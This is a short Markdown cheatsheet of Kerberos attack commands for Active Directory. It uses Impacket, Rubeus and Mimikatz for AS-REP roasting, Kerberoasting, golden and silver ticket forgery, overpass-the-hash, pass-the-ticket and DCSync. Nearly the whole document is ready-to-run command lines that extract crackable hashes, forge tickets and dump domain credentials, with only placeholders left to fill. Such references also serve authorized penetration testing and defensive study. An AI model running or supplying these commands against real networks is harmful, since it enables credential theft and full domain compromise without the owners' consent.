# Kerberos Cheatsheet

This cheatsheet provides quick reference commands for common Kerberos attacks.

## AS-REP Roasting

Target users with "Do not require Kerberos preauthentication" enabled.

**Impacket (GetNPUsers.py)**
```bash
python3 GetNPUsers.py -dc-ip <DC_IP> -request -outputfile hashes.txt <DOMAIN>/<USER> -no-pass
```

**Rubeus**
```powershell
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

## Kerberoasting

Target users with Service Principal Names (SPNs).

**Impacket (GetUserSPNs.py)**
```bash
python3 GetUserSPNs.py -request -dc-ip <DC_IP> -outputfile hashes.txt <DOMAIN>/<USER>:<PASSWORD>
```

**Rubeus**
```powershell
Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt
```

## Golden Ticket

Forge a TGT using the KRBTGT hash.

**Mimikatz**
```text
mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /id:500 /ptt
```

**Impacket (Ticketer.py)**
```bash
python3 ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn cifs/<DC_HOSTNAME> <USERNAME>
```

## Silver Ticket

Forge an ST using a service account hash.

**Mimikatz**
```text
mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_SERVER> /service:cifs /rc4:<SERVICE_HASH> /ptt
```

## Overpass-the-Hash

Request a TGT using an NTLM hash.

**Rubeus**
```powershell
Rubeus.exe asktgt /user:<USERNAME> /rc4:<NTLM_HASH> /domain:<DOMAIN> /dc:<DC_IP> /ptt
```

## Pass-the-Ticket

Import a stolen ticket.

**Mimikatz**
```text
mimikatz # kerberos::ptt <TICKET_FILE>
```

## DCSync

Extract credentials by simulating a Domain Controller.

**Mimikatz**
```text
mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:<TARGET_USER>
```

**Impacket (secretsdump.py)**
```bash
python3 secretsdump.py <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
